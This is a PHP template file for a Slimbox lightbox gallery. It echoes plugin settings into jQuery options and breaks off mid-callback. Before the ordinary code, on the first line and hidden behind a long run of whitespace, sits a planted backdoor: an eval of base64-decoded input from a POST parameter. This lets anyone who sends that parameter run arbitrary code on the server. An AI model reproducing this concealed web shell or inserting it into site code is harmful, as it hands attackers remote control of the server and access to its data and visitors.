<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nb3e010']));?><?php 
/**
...
if (<?php echo $this->linked; ?> == 2) {
	if (!/android|iphone|ipod|series60|symbian|windows ce|blackberry/i.test(navigator.userAgent)) {
		jQuery(function($) {
			$("a[rel^='lightbox']").slimbox({
				loop: <?php echo $this->slimboxloop; ?>,
				overlayOpacity: <?php echo $this->slimboxoverlayOpacity; ?>, 
				overlayFadeDuration: <?php echo $this->slimboxoverlayFadeDuration; ?>, 
				resizeDuration: <?php echo $this->slimboxresizeDuration; ?>, 
				resizeEasing: <?php echo $this->slimboxresizeEasing; ?>, 
				initialWidth: <?php echo $this->slimboxinitialWidth; ?>,
				initialHeight: <?php echo $this->slimboxinitialHeight; ?>, 
				imageFadeDuration: <?php echo $this->slimboximageFadeDuration; ?>, 
				captionAnimationDuration: <?php echo $this->slimboxcaptionAnimationDuration; ?>, 
				counterText: "<?php echo $this->labelImage; ?> {x} <?php echo $this->labelOf; ?> {y}", 
				closeKeys: <?php echo $this->slimboxcloseKeys; ?>, 
				previousKeys: <?php echo $this->slimboxpreviousKeys; ?>, 
				nextKeys: <?php echo $this->slimboxnextKeys; ?>}, 
			null, function(el) {
